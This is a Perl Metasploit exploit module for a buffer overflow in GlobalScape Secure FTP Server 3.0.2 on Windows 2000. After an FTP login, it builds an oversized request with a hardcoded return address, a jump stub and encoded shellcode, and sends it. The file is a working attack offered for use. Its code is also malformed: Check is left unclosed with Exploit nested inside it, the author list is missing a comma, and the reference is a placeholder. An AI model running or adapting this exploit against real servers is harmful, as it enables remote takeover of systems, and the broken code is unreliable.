##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::globalscape_ftp_30;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'  => 'GlobalScape Secure FTP server 3.0.2 Build 04.12.2005.1',
	'Version'  => '$Revision: 1.0 $',
	
	'Authors' =>
	  [ 'mati [at] see-security [dot] com aka muts',
	    'Iris, my wonderful wife...thanks for not throwing me out of the house'
	    'www.see-security.com'
	  	
	  ],
	
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000'],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'mutss'],
		'PASS'  => [1, 'DATA', 'Password', 'mutss'],
	  },

	'Payload' =>
	  {
		'Space'  => 1108,
		# The PexAlphaNum Encoder was playing wierd with me...
		'BadChars'  => "\x00\x20\x61\x62\x63\x64\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a",
		'MinNops'   => 0,
      		'MaxNops'   => 0,
	  },
	
	#
	# 'Encoder' =>
	#    {
	#     'Keys' => ['+alphanum'],
	#   },
	'Description'  =>  Pex::Text::Freeform(qq{

        This module exploits a buffer overflow found in GlobalScape Secure FTP Server v.3.0, by Mati Aharoni.    
        This code has *not* been thoroughly tested!  I will be updating it soon... 
}),

	'Refs'  =>
	  [
	  	['BID', '0000'],
	  ],
	  
	'DefaultTarget' => 0,
	'Targets' =>
	  [
	   	['Win2k Server SP4', 0x7C4FEDBB ],
	   	
	  ],
	  
	'Keys' => ['gsftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $encodedPayload = $self->GetVar('EncodedPayload');
  	my $shellcode   = $encodedPayload->Payload;
	my $target      = $self->Targets->[$target_idx];
	
	my $request = ("A" x 3000);
	
	substr($request, 2043, 4, pack('V', $target->[1]));
    	substr($request, 2047, 12, $self->MakeNops(12));
    	substr($request, 2059, 10, "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff");
    	substr($request, 2069, length($shellcode), $shellcode);
    	
    	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server1"); return; }
	$self->Print($r);

	$s->Send("USER ".$self->GetVar('USER')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("PASS ".$self->GetVar('PASS')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); }
	$self->Print($r);
	#print $request;
	
	$s->Send("$request\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); }
	$self->Print($r);

	sleep(2);
	return;
}
}
